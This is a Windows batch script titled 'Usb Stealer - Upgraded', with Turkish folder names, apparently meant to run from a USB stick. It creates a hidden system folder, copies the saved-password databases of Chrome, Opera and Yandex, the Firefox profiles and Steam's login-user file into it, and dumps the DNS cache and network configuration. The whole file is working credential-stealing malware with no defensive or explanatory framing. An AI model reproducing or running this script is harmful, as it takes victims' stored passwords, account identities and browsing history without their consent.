:kurulum @echo off
for /F "tokens=2" %%i in ('date /t') do set mydate=%%i
set mytime=%time%
set cks =%mydate%:%mytime%
set vars=%cks::=. %
set name="..%username%.."
set dosya=%random%
color 0c
cls
title Usb Stealer - Upgraded /Yufes/
:kurulumklasor
md %name%%dosya%
attrib +s +h %name%%dosya%
cd %name%%dosya%
md 1-calinanlar
md 2-wifi
cd 1-calinanlar
md internet-sifreleri
md Steam-name_id
cd Steam-name_id
copy "C:\Program Files (x86)\Steam\config\loginusers.vdf" kullanici-isim_ve_id.txt
cd ../
cd internet-sifreleri
md firefox
md google
md opera
md yandex
:passwordsteal
cd google
copy "%userprofile%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
cd../
cd opera
copy "%userprofile%\AppData\Roaming\Opera Software\Opera Stable\Login Data"
cd../
cd yandex
copy "%userprofile%\AppData\Local\Yandex\YandexBrowser\User Data\Default"
cd../
cd firefox
copy "%userprofile%\AppData\Mozilla\Firefox\Profiles"
cd ../../../
:2-wifihacking
cd 2-wifi
ipconfig /displaydns>aramagecmisi.txt
ipconfig>ipconfig.txt
